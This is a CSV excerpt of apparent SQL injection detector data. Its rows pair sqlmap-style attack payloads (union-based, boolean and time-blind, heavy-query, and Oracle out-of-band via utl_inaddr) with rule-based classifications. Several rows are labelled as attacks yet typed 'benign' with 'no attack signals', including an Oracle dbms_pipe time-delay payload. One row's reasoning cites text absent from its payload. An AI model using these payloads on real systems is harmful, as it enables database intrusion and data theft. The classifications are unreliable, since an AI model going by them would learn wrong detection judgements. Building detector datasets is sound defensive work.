row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
2950,-5555 ) ) as ldte where 4583 = 4583 order by 1#,1,,boolean_blind,generic,0.95,4583 = 4583 or detected — boolean_blind injection (priority 8) on generic,rule-based
2951,-1886' where 5518 = 5518 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
2952,"1%"" ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
2953,"1' ) ) as atpy where 9020 = 9020 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
2954,"1%' ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
2955,1' union all select null#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2956,"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and 'hzav' = 'hzav",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2957,1'|| ( select 'zccb' from dual where 8911 = 8911,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2958,"-3137'|| ( select 'btif' where 1718 = 1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2959,"-3819' ) ) ) union all select 9014,9014,9014,9014,9014,9014--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2960,"1%' ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
2961,"1' where 4149 = 4149 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
2962,"1 ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) )",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
2963,1 where 2382 = 2382,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2964,"-2276"" ) ) as qwow where 2321 = 2321 or 3534 = 2971--",1,,boolean_blind,generic,0.95,2321 = 2321 or detected — boolean_blind injection (priority 8) on generic,rule-based
2965,select ( case when ( 7997 = 1543 ) then 7997 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2966,"1"" ) where 5129 = 5129 order by 1--",1,,boolean_blind,generic,0.95,5129 = 5129 or detected — boolean_blind injection (priority 8) on generic,rule-based
2967,1 where 9404 = 9404,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2968,1' ) where 7252 = 7252,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2969,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( 'fnon' like 'fnon",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
